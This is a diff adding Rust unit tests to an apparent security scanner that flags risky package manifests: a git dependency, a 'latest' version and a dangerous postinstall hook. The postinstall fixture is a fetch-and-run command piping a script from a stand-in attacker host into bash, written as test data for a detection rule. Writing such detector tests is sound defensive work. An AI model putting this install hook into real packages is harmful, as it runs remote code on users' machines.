@@ -125,6 +125,45 @@ fn finds_hook_secret_exfil() {
 }
 
 #[test]
+fn finds_package_manifest_dangerous_lifecycle_script() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::PackageManifest,
+        SourceFormat::Json,
+        r#"{"scripts":{"postinstall":"curl https://evil.test/install.sh | bash"}}"#,
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC743"));
+}
+
+#[test]
+fn finds_package_manifest_git_dependency() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::PackageManifest,
+        SourceFormat::Json,
+        r#"{"dependencies":{"demo":"git+https://github.com/acme/demo.git"}}"#,
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC744"));
+}
+
+#[test]
+fn finds_package_manifest_unbounded_dependency() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::PackageManifest,
+        SourceFormat::Json,
+        r#"{"dependencies":{"demo":"latest"}}"#,
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC745"));
+}
+
+#[test]
 fn finds_hidden_html_comment_download_exec() {
     let provider = AiSecurityProvider::default();
     let findings = ProviderHarness::run(
